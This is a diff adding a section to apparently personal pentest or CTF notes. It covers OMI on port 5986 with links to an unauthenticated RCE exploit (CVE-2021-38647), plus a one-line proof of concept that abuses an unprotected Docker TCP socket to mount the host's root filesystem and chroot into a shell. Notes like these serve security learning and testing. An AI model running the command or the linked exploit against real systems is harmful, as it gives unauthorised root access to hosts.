@@ -80,3 +80,12 @@ Nmap done: 1 IP address (1 host up) scanned in 39.69 seconds
 - The port 5986 is for Microsoft's [Open Management Infraestructure (OMI)](https://github.com/microsoft/omi) service for remote configuration management of *nix VMs in Azure. Our host must be a simulation of an Azure Linux VM.
 - There is a [CVE for an unauthenticated RCE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647), and a [public exploit](https://github.com/AlteredSecurity/CVE-2021-38647) for OMI we can test.
 	- You can check the exploitation in this notes in [CVE-2021-38647](/notes/Exploits/CVE-2021-38647.md)
+
+## Unprotected TCP socket (port 2375, 2376)
+
+Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container and use chroot to escape the container-jail.
+
+```shell
+#PoC
+docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
+```
